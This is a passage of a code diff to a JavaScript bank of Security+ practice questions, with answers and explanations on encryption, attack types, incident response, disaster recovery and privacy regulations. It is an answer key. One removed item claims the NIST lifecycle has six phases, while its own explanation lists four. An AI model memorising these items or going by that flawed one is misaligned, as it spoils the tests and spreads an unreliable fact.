-            // --- START OF NEWLY ADDED QUESTIONS (Total 100) ---
-
-            // Domain 1: General Security Concepts (Adding 7 new)
-            {
-                domain: "1.0 General Security Concepts",
-                question: "Which component of the CIA triad ensures that data is accurate and has not been altered in transit?",
-                options: ["Confidentiality", "Integrity", "Availability", "Non-repudiation"],
-                answer: "Integrity",
-                explanation: "Integrity is the 'I' in the CIA triad and ensures that data is trustworthy and has not been modified by unauthorized parties. Hashing is a common method to verify integrity."
+                question: "A hospital in the US is conducting an audit to ensure it is properly protecting patient health records in accordance with federal law. Which regulation is the focus of this audit?",
+                options: ["GDPR (General Data Protection Regulation)", "PCI DSS (Payment Card Industry Data Security Standard)", "HIPAA (Health Insurance Portability and Accountability Act)", "SOX (Sarbanes-Oxley Act)"],
+                answer: "HIPAA (Health Insurance Portability and Accountability Act)",
+                explanation: "HIPAA is the US federal law that governs the security and privacy of health data (called PHI - Protected Health Information). GDPR is for the EU, PCI DSS is for credit cards, SOX is for financial governance."
             },
             {
-                domain: "1.0 General Security Concepts",
-                question: "What is the process of converting data into a format that cannot be easily understood by unauthorized parties?",
-                options: ["Hashing", "Encryption", "Steganography", "Tokenization"],
-                answer: "Encryption",
-                explanation: "Encryption transforms readable plaintext into unreadable ciphertext to ensure confidentiality. Hashing is a one-way function for integrity, steganography hides data, and tokenization replaces sensitive data with a non-sensitive equivalent."
+                domain: "5.0 Security Program Management and Oversight",
+                question: "A company in California collects personal data from its customers. Which state-level data privacy regulation, similar to GDPR, must they follow?",
+                options: ["CCPA (California Consumer Privacy Act)", "HIPAA", "COPPA", "FERPA"],
+                answer: "CCPA (California Consumer Privacy Act)",
+                explanation: "The CCPA (and its successor, CPRA) is the most comprehensive state-level data privacy law in the US, granting California residents rights over their personal data, such as the right to know, right to delete, and right to opt-out of sale."
             },
             {
-                domain: "1.0 General Security Concepts",
-                question: "A user receives a digitally signed email. Which key is used to verify the sender's signature and ensure authenticity?",
-                options: ["Sender's private key", "Sender's public key", "Receiver's private key", "Receiver's public key"],
-                answer: "Sender's public key",
-                explanation: "A digital signature is created with the sender's private key. The receiver then uses the sender's corresponding public key to decrypt the signature and verify its authenticity."
+                domain: "5.0 Security Program Management and Oversight",
+                question: "Which document is a formal contract between a service provider (like a cloud provider) and a customer, defining specific performance metrics like uptime and response time?",
+                options: ["SLA (Service Level Agreement)", "MOU (Memorandum of Understanding)", "BPA (Business Partnership Agreement)", "ISA (Interconnection Security Agreement)"],
+                answer: "SLA (Service Level Agreement)",
+                explanation: "The SLA is the contract that defines the *measurable* metrics of the service. If the provider fails to meet the SLA (e.g., 99.9% uptime), there is usually a financial penalty."
             },
             {
-                domain: "1.0 General Security Concepts",
-                question: "Which of the following is a symmetric encryption algorithm?",
-                options: ["RSA", "Diffie-Hellman", "AES", "ECC"],
-                answer: "AES",
-                explanation: "AES (Advanced Encryption Standard) is a symmetric algorithm that uses the same key for encryption and decryption. RSA, Diffie-Hellman, and ECC (Elliptic Curve Cryptography) are all asymmetric (public-key) algorithms."
-            },
-            {
-                domain: "1.0 General Security Concepts",
-                question: "A company's security policy states that all sensitive data must be labeled as 'Confidential'. What type of security control is this?",
+                domain: "5.0 Security Program Management and Oversight",
+                question: "A company's 'Acceptable Use Policy' (AUP) is what type of security control?",
                 options: ["Technical", "Physical", "Administrative", "Corrective"],
                 answer: "Administrative",
-                explanation: "Administrative (or managerial) controls are policies, procedures, and guidelines that define security practices. Data classification and labeling is a key administrative control."
-            },
-            {
-                domain: "1.0 General Security Concepts",
-                question: "What concept ensures that a user cannot deny having sent a message or made a transaction?",
-                options: ["Integrity", "Confidentiality", "Plausible deniability", "Non-repudiation"],
-                answer: "Non-repudiation",
-                explanation: "Non-repudiation is the assurance that someone cannot deny the validity of something. Digital signatures are a common mechanism to achieve non-repudiation."
-            },
-            {
-                domain: "1.0 General Security Concepts",
-                question: "A user is required to enter a password and then provide a one-time code from a mobile app. This is an example of:",
-                options: ["Single-factor authentication", "Two-factor authentication (2FA)", "Biometric authentication", "Context-based authentication"],
-                answer: "Two-factor authentication (2FA)",
-                explanation: "This is 2FA because it uses two different factor types: something you know (password) and something you have (the mobile app generating the code)."
-            },
-
-            // Domain 2: Threats, Vulnerabilities, and Mitigations (Adding 16 new)
-            {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "An attacker sends a fraudulent email to a company's CEO, impersonating the CFO and requesting an urgent wire transfer. This is a highly targeted form of what attack?",
-                options: ["Vishing", "Phishing", "Whaling", "Smishing"],
-                answer: "Whaling",
-                explanation: "Whaling is a form of spear phishing that specifically targets high-profile individuals within an organization, such as C-level executives (CEO, CFO, COO)."
-            },
-            {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "A user downloads a free game, but the software also secretly installs software that logs their keystrokes. This is an example of a:",
-                options: ["Trojan", "Worm", "Logic bomb", "Rootkit"],
-                answer: "Trojan",
-                explanation: "A Trojan (or Trojan horse) is malware that disguises itself as legitimate software. It relies on the user to execute it, after which it carries out its malicious payload (like installing a keylogger)."
-            },
-            {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "Which type of malware is designed to gain administrative-level control over a system while remaining hidden from the operating system and standard monitoring tools?",
-                options: ["Spyware", "Ransomware", "Rootkit", "Adware"],
-                answer: "Rootkit",
-                explanation: "A rootkit is specifically designed to gain 'root' (administrator) access and hide its presence, making it very difficult to detect and remove."
-            },
-            {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "An attacker positions themselves between a user and a public Wi-Fi access point, intercepting and potentially altering the communication. What is this attack?",
-                options: ["Replay attack", "Man-in-the-Middle (MITM) attack", "Denial-of-Service (DoS) attack", "Evil twin attack"],
-                answer: "Man-in-the-Middle (MITM) attack",
-                explanation: "A MITM attack occurs when an attacker secretly relays and possibly alters the communications between two parties who believe they are directly communicating with each other."
-            },
-            {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "A website is vulnerable to an attack where a user's browser is tricked into executing client-side scripts from an untrusted source, often to steal session cookies. This is a(n):",
-                options: ["SQL injection (SQLi)", "Cross-site scripting (XSS)", "Cross-site request forgery (CSRF)", "Buffer overflow"],
-                answer: "Cross-site scripting (XSS)",
-                explanation: "XSS is an injection vulnerability where malicious scripts are injected into trusted websites. The script executes in the victim's browser, allowing the attacker to bypass access controls."
-            },
-            {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "Which of the following BEST describes a zero-day vulnerability?",
-                options: ["A vulnerability that has been known for zero days and is already patched.", "A vulnerability in open-source software that costs zero dollars to exploit.", "A vulnerability that is actively being exploited by attackers before the vendor is aware of it or has released a patch.", "A vulnerability that can be exploited by an attacker with zero privileges."],
-                answer: "A vulnerability that is actively being exploited by attackers before the vendor is aware of it or has released a patch.",
-                explanation: "It is called a 'zero-day' because the vendor has had zero days to create a patch to fix the flaw once it becomes publicly known."
-            },
-            {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "A disgruntled employee writes a script that will delete all customer files if their employee account is ever disabled. What type of malware is this?",
-                options: ["Worm", "Trojan", "Logic bomb", "Polymorphic virus"],
-                answer: "Logic bomb",
-                explanation: "A logic bomb is a piece of malicious code that is designed to execute when a specific condition is met (the 'trigger'), such as an account being deleted or a specific date being reached."
-            },
-            {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "An attacker floods a server with a massive number of SYN packets from spoofed IP addresses, consuming the server's resources as it waits for the final ACK. This is known as a:",
-                options: ["Smurf attack", "SYN flood attack", "Ping of death", "Teardrop attack"],
-                answer: "SYN flood attack",
-                explanation: "A SYN flood is a type of DDoS attack that exploits the three-way handshake of TCP. It leaves the server with many half-open connections, exhausting its resources."
-            },
-            {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "What is the primary mitigation against SQL injection vulnerabilities?",
-                options: ["Using antivirus software", "Implementing a host-based firewall", "Using parameterized queries (prepared statements)", "Enforcing strong password policies"],
-                answer: "Using parameterized queries (prepared statements)",
-                explanation: "Parameterized queries ensure that user input is always treated as data and never as executable code, which fundamentally prevents SQL injection attacks."
-            },
-            {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "A user receives a text message warning that their bank account is locked, with a link to a fake website to 'verify' their credentials. This is an example of:",
-                options: ["Vishing", "Phishing", "Whaling", "Smishing"],
-                answer: "Smishing",
-                explanation: "Smishing is a phishing attack conducted over SMS (text messages). 'SMS' + 'phishing' = 'Smishing'."
-            },
-            {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "An attacker captures network traffic and later re-transmits a valid data transmission, such as a login authentication, to impersonate the user. This is a(n):",
-                options: ["Replay attack", "Man-in-the-Middle attack", "Session hijacking", "Pass-the-hash attack"],
-                answer: "Replay attack",
-                explanation: "A replay attack involves capturing network traffic and then 'replaying' it at a later time. Timestamps, session tokens, and one-time passwords are common defenses against this."
-            },
-            {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "Which of the following is a vulnerability of the WPS (Wi-Fi Protected Setup) feature on wireless routers?",
-                options: ["It is susceptible to SQL injection.", "It broadcasts the WPA3 password in plaintext.", "The 8-digit PIN can be easily brute-forced in two smaller parts.", "It only supports the outdated WEP encryption standard."],
-                answer: "The 8-digit PIN can be easily brute-forced in two smaller parts.",
-                explanation: "The WPS PIN is validated in two halves (4 digits, then 3 digits), which drastically reduces the number of guesses needed to brute-force the entire PIN, allowing an attacker to gain access to the network."
-            },
-            {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "An attacker sets up a fake Wi-Fi access point in a coffee shop with the same name as the legitimate one (e.g., 'Cafe_Free_WiFi'). This is a(n):",
-                options: ["Evil twin attack", "Bluejacking", "Bluesnarfing", "IV attack"],
-                answer: "Evil twin attack",
-                explanation: "An evil twin is a fraudulent Wi-Fi access point that appears to be legitimate. It's used to conduct man-in-the-middle attacks to eavesdrop on users' connections."
-            },
-            {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "A company's scanner reports that a web server is still using SSL 3.0. Why is this a security risk?",
-                options: ["It is vulnerable to the POODLE attack.", "It is vulnerable to SQL injection.", "It does not support asymmetric encryption.", "It requires users to have weak passwords."],
-                answer: "It is vulnerable to the POODLE attack.",
-                explanation: "POODLE (Padding Oracle On Downgraded Legacy Encryption) is a critical vulnerability that affects the SSL 3.0 protocol, allowing attackers to decrypt HTTPS traffic. All modern systems should use TLS 1.2 or higher."
-            },
-            {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "A hacker uses a tool to gather information about a target network, such as open ports, running services, and OS versions, without exploiting any vulnerabilities. This process is known as:",
-                options: ["Privilege escalation", "Lateral movement", "Reconnaissance", "Exfiltration"],
-                answer: "Reconnaissance",
-                explanation: "Reconnaissance (or 'recon') is the first phase of an attack, where the attacker gathers as much information as possible about the target to identify potential weaknesses. Tools like Nmap are commonly used for this."
-            },
-            {
-                domain: "2.0 Threats, Vulnerabilities, and Mitigations",
-                question: "What is the MOST common vector for ransomware infections in a corporate environment?",
-                options: ["Insecure wireless networks", "Malicious USB drives found in the parking lot", "Phishing emails with malicious attachments", "Zero-day operating system exploits"],
-                answer: "Phishing emails with malicious attachments",
-                explanation: "While all are possible vectors, phishing remains the most common and effective method for distributing ransomware. An employee is tricked into opening an attachment (e.g., a fake invoice) that executes the malware."
-            },
-
-            // Domain 3: Security Architecture (Adding 13 new)
-            {
-                domain: "3.0 Security Architecture",
-                question: "A company has a critical web application and wants to ensure high availability and distribute incoming traffic across multiple servers. Which network device should be used?",
-                options: ["Firewall", "Router", "Load balancer", "Proxy server"],
-                answer: "Load balancer",
-                explanation: "A load balancer distributes network traffic across a cluster of servers (a 'server farm') to ensure no single server becomes a bottleneck, thereby improving availability and responsiveness."
-            },
-            {
-                domain: "3.0 Security Architecture",
-                question: "A company is using a cloud model where they rent virtual machines, storage, and networking resources from a provider, but are responsible for managing the OS, applications, and data. This is an example of:",
-                options: ["SaaS (Software as a Service)", "PaaS (Platform as a Service)", "IaaS (Infrastructure as a Service)", "Hybrid Cloud"],
-                answer: "IaaS (Infrastructure as a Service)",
-                explanation: "In the IaaS model, the cloud provider supplies the fundamental infrastructure (servers, storage, networking), and the customer builds their platform on top of it, starting with the operating system."
-            },
-            {
-                domain: "3.0 Security Architecture",
-                question: "A security administrator wants to inspect encrypted HTTPS traffic coming into the network for malware. Which of the following must be implemented on the firewall or proxy?",
-                options: ["SSL/TLS decryption", "Port forwarding", "Network Address Translation (NAT)", "A stateful inspection rule"],
-                answer: "SSL/TLS decryption",
-                explanation: "To inspect encrypted traffic, the security device (like a next-gen firewall) must perform SSL/TLS decryption. It essentially acts as a 'man-in-the-middle,' decrypting the traffic, inspecting it, and then re-encrypting it before sending it to the destination."
-            },
-            {
-                domain: "3.0 Security Architecture",
-                question: "What is the primary security benefit of network segmentation?",
-                options: ["It increases the speed of the network.", "It prevents attackers from moving laterally across the network.", "It encrypts all traffic between segments.", "It eliminates the need for user passwords."],
-                answer: "It prevents attackers from moving laterally across the network.",
-                explanation: "Segmentation divides a network into smaller, isolated subnets. If an attacker compromises one segment (e.g., Guest Wi-Fi), segmentation and firewall rules will prevent them from easily accessing other, more sensitive segments (e.g., the corporate LAN or data center)."
-            },
-            {
-                domain: "3.0 Security Architecture",
-                question: "A company wants to provide secure remote access for its employees. Which of the following creates an encrypted tunnel from the employee's laptop to the corporate network over the internet?",
-                options: ["VLAN (Virtual LAN)", "VPN (Virtual Private Network)", "NAT (Network Address Translation)", "DMZ (Demilitarized Zone)"],
-                answer: "VPN (Virtual Private Network)",
-                explanation: "A VPN is the standard technology for creating a secure, encrypted 'tunnel' over an untrusted network (like the internet), allowing remote users to securely access internal resources."
-            },
-            {
-                domain: "3.0 Security Architecture",
-                question: "Which of the following is a network-based security control that monitors and controls incoming and outgoing network traffic based on predetermined security rules?",
-                options: ["Host-based Intrusion Detection System (HIDS)", "Antivirus software", "Firewall", "File integrity monitor"],
-                answer: "Firewall",
-                explanation: "A firewall is a network security device that acts as a barrier between a trusted internal network and untrusted external networks (like the internet). It makes decisions to 'allow' or 'deny' traffic based on rules."
-            },
-            {
-                domain: "3.0 Security Architecture",
-                question: "A company is deploying a new web application and wants to protect it from common attacks like XSS and SQL injection. Which specialized device should be placed in front of the web server?",
-                options: ["A load balancer", "An email gateway", "A network firewall", "A Web Application Firewall (WAF)"],
-                answer: "A Web Application Firewall (WAF)",
-                explanation: "A WAF is specifically designed to protect web applications by filtering and monitoring HTTP traffic. It can block requests that appear to be malicious, such as those matching patterns for SQL injection, XSS, and other common web exploits."
-            },
-            {
-                domain: "3.0 Security Architecture",
-                question: "An organization wants to simplify and centralize its authentication, authorization, and accounting (AAA) for network access. Which protocol is commonly used for this?",
-                options: ["RADIUS", "LDAP", "Kerberos", "SAML"],
-                answer: "RADIUS",
-                explanation: "RADIUS (Remote Authentication Dial-In User Service) is a client-server protocol that provides centralized AAA management for users who connect to a network service (e.g., VPNs, wireless access points)."
-            },
-            {
-                domain: "3.0 Security Architecture",
-                question: "A system administrator is hardening a server. This process involves:",
-                options: ["Installing as much software as possible to add features.", "Reducing the system's attack surface by disabling unnecessary services and ports.", "Moving the server to a public cloud for better security.", "Setting all user accounts to have administrator privileges."],
-                answer: "Reducing the system's attack surface by disabling unnecessary services and ports.",
-                explanation: "Hardening is the process of making a system more secure. A key part of this is reducing its 'attack surface'—the number of ways it can be attacked. This is done by removing or disabling non-essential services, ports, and software."
-            },
-            {
-                domain: "3.0 Security Architecture",
-                question: "A company is using a containerized environment (e.g., Docker, Kubernetes). Which of the following is a key security concern specific to this architecture?",
-                options: ["Securing the physical host machine.", "Managing vulnerabilities within container images.", "Patching the host operating system.", "All of the above."],
-                answer: "All of the above.",
-                explanation: "Container security is layered. You must secure the host OS (where containers run), the container runtime itself, and the container images (which can contain vulnerable applications or libraries). A vulnerability in any layer can compromise the others."
-            },
-            {
-                domain: "3.0 Security Architecture",
-                question: "What is the purpose of an air gap?",
-                options: ["To physically isolate a system or network from all other networks.", "To create a cooling corridor in a data center for airflow.", "To implement a wireless network that is open to the public.", "To create a DMZ between two firewalls."],
-                answer: "To physically isolate a system or network from all other networks.",
-                explanation: "An air gap is a physical security control. A system that is 'air-gapped' has no network connections (wired or wireless) to any other network, especially the internet. This is used for extremely sensitive systems (e.g., nuclear controls, high-security research)."
-            },
-            {
-                domain: "3.0 Security Architecture",
-                question: "Which endpoint protection solution provides detection, investigation, and response capabilities by monitoring endpoint data and using behavioral analysis?",
-                options: ["Traditional antivirus (AV)", "Endpoint Detection and Response (EDR)", "Network Intrusion Detection System (NIDS)", "Host-based firewall"],
-                answer: "Endpoint Detection and Response (EDR)",
-                explanation: "EDR goes beyond traditional AV (which is signature-based) by continuously monitoring endpoint activity, recording it, and using behavioral analysis to detect suspicious patterns. It also provides tools for investigation and remediation (e.g., isolating the endpoint)."
-            },
-            {
-                domain: "3.0 Security Architecture",
-                question: "A company wants to allow users to log in to multiple different cloud applications (e.g., Salesforce, G Suite, Office 365) using a single set of credentials. What technology enables this?",
-                options: ["RADIUS", "Kerberos", "Federated Identity Management (e.g., SAML)", "Multi-factor Authentication (MFA)"],
-                answer: "Federated Identity Management (e.g., SAML)",
-                explanation: "Federation (often using SAML) allows a user to authenticate once with a trusted 'Identity Provider' (IdP) and then be granted access to multiple 'Service Providers' (SPs) without logging in again. This is the basis of Single Sign-On (SSO) between different organizations."
-            },
-
-            // Domain 4: Security Operations (Adding 22 new)
-            {
-                domain: "4.0 Security Operations",
-                question: "Which of the following is NOT one of the six main phases of the NIST incident response lifecycle?",
-                options: ["Preparation", "Detection and Analysis", "Containment, Eradication, and Recovery", "Litigation"],
-                answer: "Litigation",
-                explanation: "The official phases are: 1. Preparation, 2. Detection and Analysis, 3. Containment, Eradication, & Recovery, and 4. Post-Incident Activity (Lessons Learned). Litigation is a legal process, not a technical phase of incident response."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "A company's disaster recovery plan states that in the event of a disaster, the most critical business functions must be restored from backups that are no more than 1 hour old. This metric defines the:",
-                options: ["Recovery Time Objective (RTO)", "Recovery Point Objective (RPO)", "Mean Time To Recovery (MTTR)", "Single Loss Expectancy (SLE)"],
-                answer: "Recovery Point Objective (RPO)",
-                explanation: "RPO defines the maximum *amount* of data (measured in time) that a business can afford to lose. An RPO of 1 hour means the company must have backups that are, at most, 1 hour old."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "What is the primary purpose of a 'chain of custody' in digital forensics?",
-                options: ["To document the chronological history and handling of evidence.", "To encrypt the evidence so it cannot be read.", "To create a hash of the evidence for integrity.", "To present the evidence to the media."],
-                answer: "To document the chronological history and handling of evidence.",
-                explanation: "The chain of custody is a formal log that details who collected, handled, stored, and analyzed the evidence, and when. This is critical to prove in court that the evidence was not tamtpered with."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "A security analyst is reviewing firewall logs and sees a large number of 'DENY' entries from a single IP address attempting to connect to many different ports on a server. This is likely an indication of:",
-                options: ["A port scan", "A phishing attack", "A ransomware infection", "A physical security breach"],
-                answer: "A port scan",
-                explanation: "A port scan is a reconnaissance technique where an attacker probes a server's ports to see which ones are open and what services are running. A firewall log showing many denials from one source to many ports is a classic sign of this."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "Which type of intrusion detection system (IDS) compares network traffic against a database of known malicious signatures?",
-                options: ["Signature-based (or knowledge-based)", "Anomaly-based (or behavior-based)", "Host-based (HIDS)", "Network-based (NIDS)"],
-                answer: "Signature-based (or knowledge-based)",
-                explanation: "A signature-based IDS works just like traditional antivirus. It has a database of 'signatures' (patterns) of known attacks and alerts if it sees traffic that matches one."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "What is the main difference between an Intrusion Detection System (IDS) and an Intrusion Prevention System (IPS)?",
-                options: ["An IDS is host-based, while an IPS is network-based.", "An IDS can only detect attacks, while an IPS can also block them.", "An IDS uses signatures, while an IPS uses anomaly detection.", "An IDS is for internal threats, while an IPS is for external threats."],
-                answer: "An IDS can only detect attacks, while an IPS can also block them.",
-                explanation: "An IDS is a 'passive' device; it detects a threat and sends an alert. An IPS is an 'active' (or 'inline') device; it sits in the path of the traffic and can actively drop or block malicious packets, thus 'preventing' the attack."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "A company wants to proactively test its security defenses by hiring a team to simulate a real-world attack, without giving the team any prior knowledge of the internal network. This is a:",
-                options: ["White-box penetration test", "Gray-box penetration test", "Black-box penetration test", "Vulnerability scan"],
-                answer: "Black-box penetration test",
-                explanation: "A black-box test provides the testers with zero knowledge of the target, forcing them to rely on external reconnaissance, just as a real-world external attacker would."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "What is the purpose of a 'honeypot'?",
-                options: ["To store and manage user passwords securely.", "To back up critical data in case of a disaster.", "To serve as a decoy system to attract and monitor attackers.", "To filter spam from incoming emails."],
-                answer: "To serve as a decoy system to attract and monitor attackers.",
-                explanation: "A honeypot is a system intentionally left vulnerable to attract attackers. It has no legitimate business use, so any traffic to it is inherently suspicious. It's used by security teams to study attacker techniques and tools safely."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "A SOC analyst is using a tool that automates incident response actions by integrating with other security tools. For example, it can automatically block an IP on a firewall and query an endpoint for a hash. This is a(n):",
-                options: ["SIEM (Security Information and Event Management)", "SOAR (Security Orchestration, Automation, and Response)", "NIDS (Network Intrusion Detection System)", "Vulnerability scanner"],
-                answer: "SOAR (Security Orchestration, Automation, and Response)",
-                explanation: "SOAR platforms are the next step after a SIEM. While a SIEM generates alerts, a SOAR tool takes those alerts and automates the *response* by running 'playbooks' that execute actions across different tools (firewalls, EDR, etc.)."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "During which phase of the incident response process would an analyst create a forensic image of a hard drive?",
-                options: ["Preparation", "Detection and Analysis", "Containment", "Post-Incident Activity"],
-                answer: "Detection and Analysis",
-                explanation: "While containment might be happening simultaneously, the act of collecting data (like a disk image) for deeper investigation is part of the 'Detection and Analysis' phase, where the team tries to understand the full scope of the incident."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "What type of disaster recovery site is an empty, environmentally-ready space with power and cooling, but no hardware or data?",
-                options: ["Hot site", "Warm site", "Cold site", "Cloud site"],
-                answer: "Cold site",
-                explanation: "A cold site is the cheapest option. It's just a room with basic utilities. In a disaster, the company must bring in and set up all its own equipment, making the recovery time very long."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "What type of disaster recovery site is a fully equipped, mirrored data center with all hardware and data, ready to take over operations almost instantly?",
-                options: ["Hot site", "Warm site", "Cold site", "Mobile site"],
-                answer: "Hot site",
-                explanation: "A hot site is the most expensive option. It is a complete duplicate of the primary data center, with data constantly replicated. It allows for an RTO of minutes or hours."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "A company's server was breached. The incident response team stopped the attack by disabling the compromised account and blocking the attacker's IP. Which phase of incident response have they just completed?",
-                options: ["Preparation", "Detection and Analysis", "Containment", "Eradication"],
-                answer: "Containment",
-                explanation: "Containment is the phase focused on stopping the attack from spreading and preventing further damage. Disabling accounts and blocking IPs are classic containment steps."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "After an incident, the team is now rebuilding the compromised server from a clean OS image and patching it. Which phase are they in?",
-                options: ["Preparation", "Containment", "Eradication", "Recovery"],
-                answer: "Eradication",
-                explanation: "Eradication is the phase where the root cause of the incident is eliminated. This involves removing the malware, patching the vulnerability, and rebuilding systems to ensure the attacker cannot get back in."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "A security team is holding a meeting one week after a major incident to discuss what went well, what went wrong, and how to improve the response process. This is part of which phase?",
-                options: ["Preparation", "Recovery", "Post-Incident Activity (Lessons Learned)", "Detection and Analysis"],
-                answer: "Post-Incident Activity (Lessons Learned)",
-                explanation: "This is the final and most critical phase for long-term improvement. The team documents the incident and creates a 'lessons learned' report to improve policies, tools, and procedures for the future."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "An analyst is reviewing logs from a DNS server. What type of activity would be most suspicious?",
-                options: ["A large number of 'A' record lookups for common websites.", "A workstation making many requests to a command-and-control (C2) domain.", "Periodic 'MX' record lookups by the mail server.", "Internal servers resolving internal hostnames."],
-                answer: "A workstation making many requests to a command-and-control (C2) domain.",
-                explanation: "Malware often uses DNS to find its C2 server. A workstation repeatedly looking up a known-bad or unusual domain (especially one using techniques like 'fast-flux') is a strong indicator of infection."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "A company is testing its disaster recovery plan by having a team walk through the steps on paper without actually failing over any systems. This is a:",
-                options: ["Full-scale test", "Parallel test", "Tabletop exercise", "Simulation test"],
-                answer: "Tabletop exercise",
-                explanation: "A tabletop exercise is a discussion-based session where team members walk through their roles and responsibilities in a specific scenario. It's the simplest and least disruptive way to test a plan."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "What is the primary benefit of log correlation in a SIEM?",
-                options: ["It compresses logs to save storage space.", "It combines log entries from multiple sources to identify related events.", "It encrypts logs to prevent tampering.", "It deletes old logs automatically."],
-                answer: "It combines log entries from multiple sources to identify related events.",
-                explanation: "Correlation is the power of a SIEM. It can link a failed login on one server, a firewall alert from an IP, and a file access on another server into a single, high-fidelity security event, which would be missed if logs were reviewed individually."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "A penetration tester gains user-level access to a system and then exploits a misconfiguration in a service to gain 'root' or 'SYSTEM' privileges. This is known as:",
-                options: ["Privilege escalation", "Lateral movement", "Reconnaissance", "Pivoting"],
-                answer: "Privilege escalation",
-                explanation: "Privilege escalation is the act of exploiting a flaw to gain a higher level of access than was intended. This can be 'vertical' (e.g., user to admin) or 'horizontal' (e.g., user A to user B)."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "Once an attacker has compromised a single workstation, they use that machine to scan the internal network and attack other servers. This is known as:",
-                options: ["Privilege escalation", "Lateral movement", "Initial access", "Data exfiltration"],
-                answer: "Lateral movement",
-                explanation: "Lateral movement is the process of moving 'sideways' through a network from one compromised host to another, seeking to gain access to more valuable assets or data."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "A company's vulnerability scanner, which is run weekly, is what type of security control?",
-                options: ["Preventative", "Detective", "Corrective", "Physical"],
-                answer: "Detective",
-                explanation: "A vulnerability scanner doesn't *prevent* or *fix* vulnerabilities; it *detects* them. It's a detective control that identifies weaknesses so they can be remediated."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "A SOC analyst is investigating an alert. What is the difference between a 'true positive' and a 'false positive'?",
-                options: ["A true positive is a real attack; a false positive is a legitimate activity that was incorrectly flagged as an attack.", "A true positive is an external attack; a false positive is an internal attack.", "A true positive is a blocked attack; a false positive is an unblocked attack.", "A true positive is an alert; a false positive is just a log entry."],
-                answer: "A true positive is a real attack; a false positive is a legitimate activity that was incorrectly flagged as an attack.",
-                explanation: "A 'true positive' means the alert is correct (it's a real threat). A 'false positive' is a 'false alarm'—the security tool made a mistake. A key job for a SOC analyst is 'tuning' rules to reduce false positives."
-            },
-
-            // Domain 5: Security Program Management and Oversight (Adding 15 new)
-            {
-                domain: "5.0 Security Program Management and Oversight",
-                question: "A security manager is performing a risk assessment and identifies a risk. The manager decides to purchase cybersecurity insurance to cover potential losses. This is an example of risk:",
-                options: ["Acceptance", "Avoidance", "Mitigation", "Transference"],
-                answer: "Transference",
-                explanation: "Risk transference (or 'sharing') is the act of moving the financial impact of a risk to a third party. Buying insurance is the classic example of this."
+                explanation: "Administrative (or managerial) controls are the policies, procedures, and guidelines that govern human behavior. The AUP, the password policy, and security awareness training are all administrative controls."
             },
             {
                 domain: "5.0 Security Program Management and Oversight",
-                question: "A company decides that the cost of a specific security control is far greater than the potential loss from the risk it addresses. They choose to do nothing and document the decision. This is risk:",
-                options: ["Acceptance", "Avoidance", "Mitigation", "Transference"],
-                answer: "Acceptance",
-                explanation: "Risk acceptance is a conscious decision to accept the risk without implementing any controls, usually because the cost of the control outweighs the potential loss."
+                question: "A company requires developers to use a test dataset where sensitive information (like SSNs and names) has been replaced with fake, but realistic, values. What data privacy technique is this?",
+                options: ["Encryption", "Tokenization", "Data Masking", "Hashing"],
+                answer: "Data Masking",
+                explanation: "Data Masking (or obfuscation) creates a structurally identical dataset (SSN fields still look like SSNs) but replaces the real data with fictitious data to protect privacy in non-production environments (like development and testing)."
             },
             {
                 domain: "5.0 Security Program Management and Oversight",
-                question: "A company's security policy requires all new employees to attend a security awareness training session. This is what type of control?",
-                options: ["Technical control", "Physical control", "Administrative control", "Corrective control"],
-                answer: "Administrative control",
-                explanation: "Security awareness training is a key administrative (or managerial) control. It's a policy/procedure designed to influence user behavior and enforce the security program."
-            },
-            {
-                domain: "5.0 Security Program Management and Oversight",
-                question: "What is the primary purpose of an Acceptable Use Policy (AUP)?",
-                options: ["To define how to respond to a security incident.", "To classify data based on its sensitivity.", "To detail the steps for disaster recovery.", "To inform employees of what is and is not allowed on company equipment."],
-                answer: "To inform employees of what is and is not allowed on company equipment.",
-                explanation: "An AUP is a document that defines the rules and constraints users must agree to in order to access company resources. It typically prohibits personal use, illegal activities, and installing unauthorized software."
-            },
-            {
-                domain: "5.0 Security Program Management and Oversight",
-                question: "Which of the following data roles is responsible for the *overall* security and use of data, and is often a senior manager or executive?",
+                question: "Which data governance role is responsible for the *technical* implementation of data protection (e.g., running backups, patching the DB, configuring permissions)?",
                 options: ["Data Owner", "Data Steward", "Data Custodian", "Data Subject"],
-                answer: "Data Owner",
-                explanation: "The Data Owner (or Information Owner) is the business-level manager who is ultimately responsible for the data. They make decisions about classification, access rights, and protection."
-            },
-            {
